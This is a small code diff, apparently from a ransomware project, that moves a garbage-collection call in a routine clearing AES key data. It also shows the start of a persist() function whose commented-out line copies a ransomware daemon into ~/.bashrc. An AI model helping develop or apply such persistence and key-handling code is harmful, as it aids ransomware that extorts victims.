@@ -174,8 +174,8 @@ def menu():
 
         # free the memory
         aes_keys_and_base64_path = None
-        gc.collect()
         del aes_keys_and_base64_path
+        gc.collect()
 
 def persist():
     # cp = 'cp ' + ransomware_path + 'daemon ~/.bashrc'
